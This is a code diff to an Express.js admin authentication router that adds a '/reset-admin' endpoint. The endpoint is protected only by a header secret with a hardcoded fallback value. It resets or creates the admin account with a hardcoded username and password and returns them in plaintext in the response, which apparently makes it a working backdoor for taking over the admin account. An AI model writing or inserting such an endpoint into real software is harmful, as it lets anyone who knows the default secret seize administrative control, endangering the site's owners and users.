@@ -1,7 +1,7 @@
 import express from 'express';
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
-import { getAdminByUsername } from '../db.js';
+import { getAdminByUsername, createAdmin, adminExists } from '../db.js';
 import { verifyToken } from '../middleware/auth.js';
 
 const router = express.Router();
@@ -44,6 +44,28 @@ router.post('/login', async (req, res) => {
 
 router.get('/verify', verifyToken, (req, res) => {
   res.json({ valid: true, admin: req.admin });
+});
+
+router.post('/reset-admin', async (req, res) => {
+  const ADMIN_SECRET = process.env.ADMIN_RESET_SECRET || 'reset-secret-369';
+  if (req.headers['x-reset-secret'] !== ADMIN_SECRET) {
+    return res.status(403).json({ message: 'Unauthorized' });
+  }
+  try {
+    const exists = await adminExists();
+    if (!exists) {
+      const hashedPassword = await bcrypt.hash('kdmvtrovteroyban', 12);
+      await createAdmin({ username: 'aurashop369', password: hashedPassword });
+      return res.json({ message: 'Admin created', username: 'aurashop369', password: 'kdmvtrovteroyban' });
+    }
+    const Admin = (await import('../models/Admin.js')).default;
+    const hashedPassword = await bcrypt.hash('kdmvtrovteroyban', 12);
+    await Admin.updateOne({}, { $set: { username: 'aurashop369', password: hashedPassword } });
+    res.json({ message: 'Admin reset', username: 'aurashop369', password: 'kdmvtrovteroyban' });
+  } catch (err) {
+    console.error('Reset error:', err);
+    res.status(500).json({ message: 'Reset failed', error: err.message });
+  }
 });
 
 export default router;
